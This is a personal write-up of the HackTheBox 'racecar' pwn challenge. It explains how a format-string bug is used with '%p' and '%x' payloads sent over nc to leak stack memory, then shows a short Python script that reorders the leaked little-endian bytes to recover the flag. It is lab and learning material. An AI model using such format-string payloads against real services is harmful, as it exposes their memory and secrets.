

I actually did not solve this as intended, but a flag is a flag.

The solve I used I actually learnt from the first and only pwn Pico challenge I attempted and completed. However, I read another solve where they also used the size of the flag (44) and offsets to leak only that part of the memory. I actually prefer my way as it is much more straight forward and truly shows how bad the vulnerability was; aka leaving data on the stack with formatting errors. See image below showing the vulnerability in the code:

![[racecar the vulnerable format code.png]]


# Notes from Kali
# Getting There
RUNNING THE INSTANCE WITH NC PRINTED THE 'man, myth, legend' STRING WHICH THE LOCAL BINARY DID NOT...


### First Look
ASLR enabled:
![[racecar ldd showing ASLR enabled.png]]

Decompiled code:
![[racecar ghidra decompiled code.png]]


Upon the first formt, 0x170 is alocated in the malloc(), whereas when used in read, 0x171 is used. This must surely be the bug! --> meaning there is some leftover space to insert extra code? _Edit: sortof, it enables you to insert code after the flag is on the stack before it is printed, so can be accessed_

With the line of code `p.sendline(b"%x | %p | %u")`, this is also justified with the output `0x170` (see sc). Repeating the same with only `%p`'s returns three different addresses: `b'0x584881c0 | 0x170 | 0x5657bdfa\n'` --> weird how the 170 is in the middle...

There's a place to leak some stuff at least...

printing all the addresses, this was all we got:
`
56f6f1c0-170-565a8dfa-2f-3-26-2-1-565a996c-56f6f1c0-56f6f340-7b425448-5f796877-5f643164-34735f31-745f3376-665f3368-5f67346c-745f6e30-355f3368-6b633474-7d213f-23e5dc00-f7f9f3fc-565abf8c-ffe77788-565a9441-1-ffe77834-ffe7783c-23e5dc00-ffe777a0-0-0-f7de2f21-f7f9f000-f7f9f000-0-f7de2f21-1-ffe77834-ffe7783c-ffe777c4-1-ffe77834-f7f9f000-f7fbd70a-ffe77830-0-f7f9f000-0-0-16d96954-646bef44-0-0-0-40-f7fd5024-0-0-f7fbd819-565abf8c-1-565a8790-0-565a87c1-565a93e1-1-ffe77834-565a9490-565a94f0-f7fbd960-ffe7782c-f7fd5940-1-ffe77d3d-0-ffe77d4f-ffe77d71-ffe77d9d-ffe77dbc-ffe77ddf-ffe77e0c-ffe77e21-ffe77e3d-ffe77e5b-ffe77e77-ffe77e9f-ffe77ee1-ffe77f06-ffe77f27-ffe77f32-ffe77f54-ffe77f61-ffe77f6e-ffe77f84-ffe77fa0-ffe77fb4-ffe77fd1-0-20-f7fac550-21-f7fac000-10-1f8bfbff-6-1000-11-64-3-565a8034-4-20-5-9-7-f7fae000-8-0-9-565a8790

![[racecar cyberchef.png]]

this could then be converted from hex, either using cyberchef (see above) or creating a Python script, and would then reveal the flag in ittle endian which again could also be made right with a script:

```Python
#! /usr/bin/env python


# Code to reverse the results of leaking the addresses and stack:

to_reverse  = "{BTH_yhw_d1d4s_1t_3vf_3h_g4lt_n05_3hkc4t}!?"
print("".join(reversed(to_reverse)))

tmp = []
s = ""
for i in range(0, len(to_reverse), 4):
        tmp.append(to_reverse[i:i+4])
        #s += to_reverse[i:i+4]

print(tmp)

tmp2 = []
for i in tmp:
        tmp2.append("".join(reversed(i)))

s2 = ""
for i in tmp2:
        s2 += i

print(s2)
#HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
```

![[racecar script showing final flag.png]]